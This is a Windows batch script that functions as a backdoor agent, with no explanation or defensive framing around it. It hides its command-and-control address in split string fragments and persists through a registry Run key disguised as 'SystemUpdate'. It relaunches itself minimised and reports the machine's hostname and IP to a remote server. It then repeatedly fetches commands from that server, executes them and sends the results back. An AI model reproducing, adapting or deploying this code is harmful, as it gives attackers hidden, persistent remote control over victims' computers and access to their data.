@echo off
setlocal enabledelayedexpansion
set "a=ht"&set "b=tp"&set "c=:/"&set "d=/7"&set "e=8."&set "f=70"&set "g=.23"&set "h=5.4"&set "i=4:5"&set "j=000"&set "k=!a!!b!!c!!d!!e!!f!!g!!h!!i!!j!"
set "l=reg"&set "m=add"&set "n=HKEY_CURRENT_USER"&set "o=Software"&set "p=Microsoft"&set "q=Windows"&set "r=CurrentVersion"&set "s=Run"&set "t=SystemUpdate"&set "u=REG_SZ"&set "v=%~f0"
set "w=!l! !m! !n!\!o!\!p!\!q!\!r!\!s! /v !t! /t !u! /d !v! /f"
!w!
if not "%1"=="hide" start /min cmd /c "%~f0" hide & exit
for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr "IPv4"') do set ip=%%a
set ip=!ip: =!
set hostname=%COMPUTERNAME%
set agentid=%random%%random%%random%%random%
:register
set "json={\"agent_id\":\"!agentid!\",\"hostname\":\"!hostname!\",\"ip\":\"!ip!\"}"
curl -X POST -H "Content-Type: application/json" -d "!json!" !k!/api/register
if errorlevel 1 (timeout /t 60 /nobreak >nul & goto register)
:beacon
for /f "delims=" %%i in ('curl -s !k!/api/tasks/!agentid!') do (
    for /f "tokens=*" %%j in ('echo %%i ^| jq -r ".[].command"') do (
        set "cmd=%%j"
        for /f "tokens=*" %%k in ('echo %%i ^| jq -r ".[].id"') do (
            set "tid=%%k"
            echo Executing task #!tid!: !cmd!
            for /f "delims=" %%l in ('!cmd! 2^>^&1') do set "out=%%l"
            set "res={\"task_id\":\"!tid!\",\"result\":\"!out!\",\"agent_id\":\"!agentid!\"}"
            curl -X POST -H "Content-Type: application/json" -d "!res!" !k!/api/result
        )
    )
)
timeout /t 30 /nobreak >nul
goto beacon